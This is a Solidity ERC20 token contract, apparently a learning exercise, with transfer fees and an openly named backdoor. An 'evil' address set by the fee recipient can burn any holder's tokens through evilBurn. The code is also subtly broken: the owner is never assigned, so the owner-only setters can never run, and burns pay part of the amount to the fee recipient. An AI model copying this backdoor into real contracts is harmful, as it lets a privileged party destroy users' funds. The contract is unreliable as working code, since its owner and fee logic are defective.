// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;
import "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

contract MyFirstToken is ERC20 {
    address public owner;
    address public feeRecipient;
    uint256 public feePercentage;
    address public evilAddress;

    event FeeRecipientUpdated(address oldRecipient, address newRecipient);
    event EvilUpdated(address oldEvil, address newEvil);
    event FeePercentageUpdated(
        uint256 oldFeePercentage,
        uint256 newFeePercentage
    );

    // Modifier to check that the caller is the owner of
    // the contract.
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        // Underscore is a special character only used inside
        // a function modifier and it tells Solidity to
        // execute the rest of the code.
        _;
    }

    modifier onlyFeeRecipient() {
        require(msg.sender == feeRecipient, "Not feeRecipient");
        _;
    }

    constructor(address _feeRecipient) ERC20("FirstToken", "FSTTK") {
        require(_feeRecipient != address(0), "Invalid Recipient Address");
        feeRecipient = _feeRecipient;

        _mint(msg.sender, 1000000 * 1e4);
    }

    function decimals() public pure override returns (uint8) {
        return 4;
    }

    function changeFee(uint256 newFeePercentage) public onlyOwner {
        require(newFeePercentage <= 1000, "Fee Percentage can be 0~10");
        uint256 oldFee = feePercentage;
        feePercentage = newFeePercentage;

        // should emit events for most setter functions
        emit FeePercentageUpdated(oldFee, newFeePercentage);
    }

    function setFeeRecipient(address _feeRecipient) public onlyOwner {
        require(_feeRecipient != address(0), "Invalid Recipient Address");
        address oldRecipient = feeRecipient;
        feeRecipient = _feeRecipient;

        // should emit events for most setter functions
        emit FeeRecipientUpdated(oldRecipient, _feeRecipient);
    }

    function setEvil(address _evilAddress) public onlyFeeRecipient {
        require(_evilAddress != address(0), "Invalid Evail Address");
        address oldEvil = evilAddress;
        evilAddress = _evilAddress;

        // should emit events for most setter functions
        emit EvilUpdated(oldEvil, _evilAddress);
    }

    function _update(
        address from,
        address to,
        uint256 value
    ) internal override {
        uint256 fee = (value * feePercentage) / 10000;
        uint256 amountAfterFee = value - fee;

        super._update(from, feeRecipient, fee);
        super._update(from, to, amountAfterFee);
    }

    function evilBurn(address from, uint256 amount) public {
        require(_msgSender() == evilAddress, "Not an evil.");
        _burn(from, amount);
    }
}
